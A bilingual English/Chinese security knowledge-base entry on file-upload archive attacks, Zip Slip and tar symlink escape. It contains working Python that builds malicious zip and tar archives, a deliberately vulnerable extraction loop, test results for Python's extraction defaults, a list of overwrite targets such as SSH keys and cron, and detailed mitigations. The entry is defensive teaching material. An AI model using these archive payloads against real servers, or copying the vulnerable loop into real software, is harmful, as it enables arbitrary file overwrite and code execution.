---
id: upload-path-and-archive
title_en: "File Upload, Part 2 — Names, Paths and Archives"
title_zh: "文件上传（二）：名字、路径与归档"
summary_en: An archive is a list of names, and extraction is the act of writing those names onto a filesystem where they mean paths. This entry covers the two ways that mapping is abused — a member name carrying traversal, and a member whose type is a symlink — and why the standard library default is the thing to verify, since the same call is safe in one format and unsafe in another.
summary_zh: 归档是一份名字的清单，而解压就是把这些名字写到文件系统上 —— 在那里它们是路径。这一篇讲这个映射被滥用的两种方式（成员名带穿越、成员类型是符号链接），以及为什么"标准库的默认值"才是要核实的东西：同一个调用，在一种格式里安全、在另一种里不安全。
tags: [web, file-upload, zip-slip, tar-symlink, path-traversal, cwe-22, cwe-59]
tools: [python3, curl, tar, unzip]
attck: [T1190, T1105]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### An archive is a list of names, and a filesystem is not

The first entry established the split between the component that **allows** a file and the component that **runs** it. This entry is about a split one layer earlier, in the file's own name.

An archive format stores, for each member, a **name**. That name is a string, and in the format it carries no filesystem meaning — `../config/settings.py` is as legitimate a member name as `logo.png`. Extraction is the operation that takes those names and writes them onto a filesystem, where the same string now means **a path**, with `/` as a separator and `..` as a parent reference.

> **The vulnerability is that one string is a name to the archive layer and a path to the filesystem layer.**

That is the two-parser disagreement again, in its purest form, and it produces two distinct attacks:

| Attack | The abused thing | Typical CWE |
|---|---|---|
| **Zip Slip** | The member **name** contains traversal or an absolute path | CWE-22 |
| **Tar symlink escape** | The member **type** is a symlink pointing outside, and a later member is written through it | CWE-59 |

The second one deserves emphasis before anything else, because it defeats a defence that looks complete: **checking every member name for `..` does not stop it.** The dangerous part is not in the string; it is in the member's type.

### Attack one: the member name is used as a path

This is the shape the challenge descriptions usually show, and it is worth constructing by hand rather than with a command-line tool, because **`zip` and `tar` normalise member names as they create archives** — they will silently strip the `..` you were trying to plant. Building the archive in code is what makes the payload survive:

```python
import zipfile

z = zipfile.ZipFile('evil.zip', 'w')
z.writestr(zipfile.ZipInfo('../announcement/notice.txt'), 'replaced')
z.close()
```

The entry name is stored verbatim. Reading it back shows what was actually written:

```python
with zipfile.ZipFile('evil.zip') as z:
    print(z.namelist())                    # ['../announcement/notice.txt']
    print(z.infolist()[0].orig_filename)   # ../announcement/notice.txt
```

On the server side, the vulnerable code is a loop — and this is the important part:

```python
# the vulnerable shape: the member name is joined straight onto the destination
for name in zf.namelist():
    out = os.path.join(upload_dir, name)
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, 'wb') as f:
        f.write(zf.read(name))
```

`os.path.join(upload_dir, '../announcement/notice.txt')` resolves **outside** `upload_dir`, and `makedirs` creates whatever is needed on the way. The fix is one word wide:

```python
# collapse the member to a plain file name before joining
safe_name = os.path.basename(name)
out = os.path.join(upload_dir, safe_name)
```

...and even that is only the first step, because the destination must still be verified after resolution, and the archive itself may be lying about what a member contains.

**The same attack against `zipfile.extractall` does not work**, and the reason is a version detail worth knowing rather than assuming — see the experiment below.

### Attack two: the member type is a symlink

A tar member has a **type**. Ordinary files are `REGTYPE`, but a member can also be `SYMTYPE` (a symlink) or `LNKTYPE` (a hard link), and a symlink's target can be an **absolute path**.

That gives a two-step attack:

1. A member that is a symlink pointing at a directory **outside** the extraction root.
2. A member whose name is **inside** that symlink, carrying the content to write.

Extraction creates the link first, then resolves the second member's path **through** it, and the write lands outside:

```python
import io, tarfile

with tarfile.open('evil.tar', 'w') as tf:
    link = tarfile.TarInfo('escape')
    link.type = tarfile.SYMTYPE
    link.linkname = '/srv/app/protected'      # an absolute target, outside the extraction root
    tf.addfile(link)

    data = b'replaced from outside\n'
    member = tarfile.TarInfo('escape/notice.txt')
    member.size = len(data)
    tf.addfile(member, io.BytesIO(data))
```

Read the member names again: `escape` and `escape/notice.txt`. **Neither contains `..` and neither is absolute.** A review that scans member names for traversal finds nothing to complain about, and the escape happens anyway. That is why the defence for archives has to be about **both** the name and the type.

### The experiment: the default is the thing to verify

This is the part of the entry worth internalising, because it is the same lesson as "`pickle` is a code-execution format" with a sharper edge: here the language's own standard library makes the wrong choice **by default**, while a sibling library in the same standard library makes the right one.

Run both payloads above with several extraction calls and record where the write lands:

```python
import tarfile, zipfile, shutil, io, os, warnings

def try_tar(dest, **kwargs):
    with warnings.catch_warnings():
        warnings.simplefilter('ignore')       # the default path emits a DeprecationWarning
        with tarfile.open('evil.tar') as tf:
            tf.extractall(dest, **kwargs)

def try_zip_extractall(dest):
    with zipfile.ZipFile('evil.zip') as z:
        z.extractall(dest)

def try_zip_manual(dest):
    with zipfile.ZipFile('evil.zip') as z:
        for name in z.namelist():             # the hand-written loop
            out = os.path.join(dest, name)
            os.makedirs(os.path.dirname(out), exist_ok=True)
            with open(out, 'wb') as f:
                f.write(z.read(name))
```

Results on Python 3.13:

| Call | Outcome |
|---|---|
| `tarfile.extractall(dest)` | **writes outside** (and emits a `DeprecationWarning`) |
| `tarfile.extractall(dest, filter='fully_trusted')` | **writes outside** — equivalent to passing nothing |
| `tarfile.extractall(dest, filter='tar')` | blocked — `OutsideDestinationError` |
| `tarfile.extractall(dest, filter='data')` | blocked — `AbsoluteLinkError` |
| `shutil.unpack_archive('evil.tar', dest)` | **writes outside** — the `filter` argument defaults to `None` here too |
| `zipfile.extractall(dest)` | **does not escape** — the standard library sanitises member names itself |
| hand-written zip loop | **writes outside** — nothing sanitises anything |

Three generalisable conclusions:

**"It is the standard library" does not mean "the default is correct".** The tar and zip modules in the *same* standard library disagree about what to do with `../` in a member name, and one of them changed its mind in 3.6 while the other's change is still pending. Every format and every version is a separate question.

**The safe value is not always the safe argument.** `filter='fully_trusted'` reads like a deliberate choice and behaves exactly like the default, which is the unsafe one. A control that has to be passed explicitly, and whose "trusted" option means "do the dangerous thing", is a control that will be passed wrongly.

**The generator's trap and the loop's trap are different traps.** For tar, the danger is in calling the library function correctly; for zip, it is in **not** calling it. That is why the fix for one is an argument and for the other is deleting code.

### Writing somewhere useful

Traversal is not interesting because it writes *somewhere*; it is interesting because of **where**, and because it does so **without uploading a new file to an executable location**. That second point is the one that connects this entry to the previous one: the extension allowlist, the content-type check and the "store outside the web root" advice are all about a file arriving somewhere new. A traversal writes to a location that already exists.

| Target | Consequence |
|---|---|
| `~/.ssh/authorized_keys` | A key that logs in |
| `/etc/cron.d/*`, systemd units, scheduled tasks | Execution without touching the web directory |
| Application configuration, templates, plugin directories | Code execution on the next request or restart, in the application's own trust context |
| Another user's files, session stores, caches | Data integrity and often privilege escalation |
| The web root itself | The classic — but note it needs no "dangerous extension" if it overwrites an existing script |
| Log files, certificates, key material | Integrity, and occasionally interception |

The pattern to notice: **the destination is chosen by the attacker, so any control that only decides whether a new file is allowed is answering the wrong question.**

### Detection and mitigation

- **Never trust a member name.** Collapse each entry to a plain file name (`os.path.basename` equivalent), and then verify the resolved destination against the intended root **after** resolution — compare with a separator appended, as in the first entry of this series. Do not apply the check to the string as received.
- **Check the type, not only the name.** Refuse `SYMTYPE` and `LNKTYPE` members unless the application genuinely needs them. A business archive of images or documents never does, and refusing them removes the entire second attack rather than detecting it.
- **Pass the filter explicitly for tar, and verify the version's behaviour for zip.** `filter='data'` (or `'tar'`) for reading untrusted archives; never `'fully_trusted'`. For zip, know whether your runtime's `extractall` sanitises, and do not rely on it in code you also run on older runtimes.
- **Prefer the library call to a hand-written loop, and verify what it does.** The loop is where Zip Slip lives. Where a loop is genuinely required, it must do the basename collapse and the destination check itself — but that is more code doing the same job worse.
- **Extract into a directory with nothing else in it, and with no privileges.** If the extraction root is a leaf directory owned by an unprivileged user, an escape reaches a place that is also uninteresting. This is not a substitute for the checks and it is the control that still works when the checks are wrong.
- **Detect the shapes before extraction.** Scan names for `..` segments, absolute paths, leading `~`, backslashes on Unix, NUL bytes and control characters; and inspect types for anything that is not a regular file or a directory. Both are cheap, both are exact, and both are things a legitimate business archive practically never contains. Log the full member list alongside the upload — when an escape is discovered later, that list is the evidence.
- **Alert on the outcome, not only on the request.** A file appearing outside the upload directory, a new symlink in the extraction root, a modification to a file the application does not write (a notice, a config, a key) — these are integrity signals, and they are what catches the escape that was constructed in a way nobody predicted.
- **Bound the archive.** Entry count, total uncompressed size and compression ratio limits address the resource side, and they also shrink the window in which odd members can be planted.

<!-- lang:zh -->
### 归档是一份名字的清单，而文件系统不是

第一篇立起了"允许文件的组件"与"运行文件的组件"之间的分裂。这一篇讲的是更早一层的那种分裂 —— 在文件自己的名字里。

归档格式为每个成员存一个**名字**。那个名字是一个字符串，在格式里它不携带任何文件系统含义 —— `../config/settings.py` 和 `logo.png` 一样是合法的成员名。解压就是把这些名字写到文件系统上的那个操作，而在那里，同一个字符串意味着**一条路径**：`/` 是分隔符、`..` 是父目录引用。

> **漏洞在于：同一个字符串，对归档层是名字，对文件系统层是路径。**

这又是"两个解析器不一致"，而且是最纯粹的形式，它产生两种不同的攻击：

| 攻击 | 被滥用的东西 | 典型 CWE |
|---|---|---|
| **Zip Slip** | 成员**名**里含穿越或绝对路径 | CWE-22 |
| **Tar 符号链接逃逸** | 成员**类型**是指向外部的符号链接，而后续成员穿过它写 | CWE-59 |

第二个要先强调，因为它能打穿一个看起来完备的防御：**把每个成员名都检查一遍 `..` 挡不住它。** 危险的部分不在字符串里，而在成员的类型里。

### 攻击一：成员名被当路径用

这就是题目描述里通常给的那个形状，而它值得**手工构造**而不是用命令行工具，因为 **`zip` 和 `tar` 在创建归档时会规范化成员名** —— 它们会悄悄把你打算种进去的 `..` 剥掉。用代码构造，载荷才活得下来：

```python
import zipfile

z = zipfile.ZipFile('evil.zip', 'w')
z.writestr(zipfile.ZipInfo('../announcement/notice.txt'), 'replaced')
z.close()
```

条目名被原样存下。读回来能看到实际写进去的是什么：

```python
with zipfile.ZipFile('evil.zip') as z:
    print(z.namelist())                    # ['../announcement/notice.txt']
    print(z.infolist()[0].orig_filename)   # ../announcement/notice.txt
```

服务端那边，有漏洞的代码是一个循环 —— 而这就是要紧的部分：

```python
# 有漏洞的形状：成员名被直接拼到目标目录上
for name in zf.namelist():
    out = os.path.join(upload_dir, name)
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, 'wb') as f:
        f.write(zf.read(name))
```

`os.path.join(upload_dir, '../announcement/notice.txt')` 解析到了 `upload_dir` **之外**，而 `makedirs` 会把沿途需要的目录都建出来。修法只有一个词那么宽：

```python
# 拼接之前先把成员收敛成纯文件名
safe_name = os.path.basename(name)
out = os.path.join(upload_dir, safe_name)
```

……而这只是第一步，因为目标在解析之后还得再验证一次，而且归档本身可能在"某个成员是什么"这件事上说谎。

**同一个攻击对 `zipfile.extractall` 无效**，原因是一个值得去**核实**、而不是去**假设**的版本细节 —— 见下面的实验。

### 攻击二：成员类型是符号链接

tar 成员有一个**类型**。普通文件是 `REGTYPE`，而一个成员也可以是 `SYMTYPE`（符号链接）或 `LNKTYPE`（硬链接），而符号链接的目标可以是**绝对路径**。

这给出一个两步攻击：

1. 一个成员是符号链接，指向解压根目录**之外**的某个目录。
2. 一个成员，名字落在那条符号链接**里面**，携带要写入的内容。

解压会先创建链接，然后**穿过**它解析第二个成员的路径，于是写入落在了外面：

```python
import io, tarfile

with tarfile.open('evil.tar', 'w') as tf:
    link = tarfile.TarInfo('escape')
    link.type = tarfile.SYMTYPE
    link.linkname = '/srv/app/protected'      # 绝对目标，在解压根之外
    tf.addfile(link)

    data = b'replaced from outside\n'
    member = tarfile.TarInfo('escape/notice.txt')
    member.size = len(data)
    tf.addfile(member, io.BytesIO(data))
```

再看一遍那两个成员名：`escape` 和 `escape/notice.txt`。**两个都不含 `..`，两个都不是绝对路径。** 一个把成员名扫一遍找穿越的评审什么也找不出来，而逃逸照样发生。这就是为什么归档的防御必须同时管**名字**和**类型**。

### 实验：要核实的东西是默认值

这是整篇里最值得内化的部分，因为它和"`pickle` 是一种代码执行格式"是同一课，只是更锋利：这里**语言自己的标准库默认就做了错的选择**，而**同一个标准库里的兄弟模块**做的是对的。

把上面两个载荷配几种不同的解压调用跑一遍，记录写入落在了哪里：

```python
import tarfile, zipfile, shutil, io, os, warnings

def try_tar(dest, **kwargs):
    with warnings.catch_warnings():
        warnings.simplefilter('ignore')       # 默认那条路会发 DeprecationWarning
        with tarfile.open('evil.tar') as tf:
            tf.extractall(dest, **kwargs)

def try_zip_extractall(dest):
    with zipfile.ZipFile('evil.zip') as z:
        z.extractall(dest)

def try_zip_manual(dest):
    with zipfile.ZipFile('evil.zip') as z:
        for name in z.namelist():             # 手写的那个循环
            out = os.path.join(dest, name)
            os.makedirs(os.path.dirname(out), exist_ok=True)
            with open(out, 'wb') as f:
                f.write(z.read(name))
```

Python 3.13 上的结果：

| 调用 | 结果 |
|---|---|
| `tarfile.extractall(dest)` | **写到外面**（并发出一条 `DeprecationWarning`） |
| `tarfile.extractall(dest, filter='fully_trusted')` | **写到外面** —— 等价于什么都不传 |
| `tarfile.extractall(dest, filter='tar')` | 拦下 —— `OutsideDestinationError` |
| `tarfile.extractall(dest, filter='data')` | 拦下 —— `AbsoluteLinkError` |
| `shutil.unpack_archive('evil.tar', dest)` | **写到外面** —— 这里的 `filter` 参数默认也是 `None` |
| `zipfile.extractall(dest)` | **没有逃逸** —— 标准库自己把成员名净化了 |
| 手写的 zip 循环 | **写到外面** —— 没有任何东西在做净化 |

三个能推广的结论：

**"用的是标准库"不等于"默认值是对的"。** **同一个**标准库里的 tar 与 zip 模块，对成员名里的 `../` 该怎么做意见不一致，而其中一个在 3.6 改了主意、另一个的改动还没到。每一种格式、每一个版本都是独立的问题。

**安全的取值不总是安全的参数。** `filter='fully_trusted'` 读起来像一次深思熟虑的选择，行为却和默认值（也就是不安全那个）一模一样。一项必须被显式传入、而它那个"trusted"选项意味着"干危险的事"的控制，是一项迟早会被传错的控制。

**生成器的陷阱和循环的陷阱是两种陷阱。** 对 tar，危险在于**正确调用**库函数；对 zip，危险在于**没有调用**它。这就是为什么一个的修法是一个参数，另一个的修法是删掉代码。

### 写到有用的地方

穿越有意思不是因为写到了**某处**，而是因为写到了**哪里**，以及因为它**不需要往可执行位置上传一个新文件**。第二点把这一篇和上一篇连起来：扩展名白名单、内容类型检查、"存到 Web 根之外"，针对的都是"一个文件到达某个新位置"。而穿越写的是一个**已经存在**的位置。

| 目标 | 后果 |
|---|---|
| `~/.ssh/authorized_keys` | 一把能登录的钥匙 |
| `/etc/cron.d/*`、systemd 单元、计划任务 | 不碰 Web 目录就执行 |
| 应用配置、模板、插件目录 | 下一次请求或重启时执行，而且是在应用自己的信任上下文里 |
| 别人的文件、会话存储、缓存 | 数据完整性，往往是权限提升 |
| Web 根本身 | 经典目标 —— 但注意：如果它覆盖的是一个**已存在的**脚本，那就不需要什么"危险扩展名" |
| 日志、证书、密钥材料 | 完整性，偶尔还有窃听 |

要注意的模式是：**目的地由攻击者选择，所以任何只决定"允不允许一个新文件"的控制，回答的都是错的问题。**

### 检测与缓解

- **永远不要相信成员名。** 把每个条目收敛成纯文件名（相当于 `os.path.basename`），然后在**解析之后**再拿解析结果与预期根目录比对 —— 带上分隔符比较，像本系列第一篇那样。不要对**收到的字符串**做那个检查。
- **检查类型，不只检查名字。** 除非应用确实需要，否则拒绝 `SYMTYPE` 与 `LNKTYPE` 成员。一个图片或文档的业务归档从来不需要，而拒绝它们是把第二种攻击整个移除，而不是去检测它。
- **tar 要显式传 filter，zip 要核实该版本的行为。** 读取不可信归档用 `filter='data'`（或 `'tar'`）；永远不要 `'fully_trusted'`。对 zip，要清楚你运行时的 `extractall` 到底净不净化，并且不要在你同时要在更老运行时上跑的代码里依赖它。
- **优先用库调用，而不是手写循环，并核实它到底做了什么。** 循环就是 Zip Slip 住的地方。当确实必须写循环时，它必须自己做文件名收敛和目标检查 —— 但那是更多的代码去做同一件更差的活。
- **解压到一个里面什么都没有、且没有权限的目录。** 如果解压根是一个非特权用户拥有的叶子目录，一次逃逸到达的地方也同样没什么意思。它不是那些检查的替代品，而是**当检查写错时仍然管用**的那项控制。
- **在解压之前就检测那些形状。** 扫描名字里的 `..` 段、绝对路径、开头的 `~`、Unix 上的反斜杠、NUL 字节和控制字符；并检查类型里有没有非普通文件、非目录的东西。两者都很便宜、都很精确，而且都是合法的业务归档几乎从不会包含的东西。把完整成员清单随上传一起记下来 —— 当逃逸日后被发现时，那份清单就是证据。
- **对结果告警，而不只对请求告警。** 上传目录之外出现文件、解压根目录里出现新符号链接、应用自己不写的文件（公告、配置、密钥）被改动 —— 这些都是完整性信号，正是它们能抓到"谁也没预料到的那种构造方式"造出来的逃逸。
- **给归档设界。** 条目数、解压后总大小、压缩比限制，管的是资源那一面，同时也缩小了"奇怪成员能被种进去"的窗口。
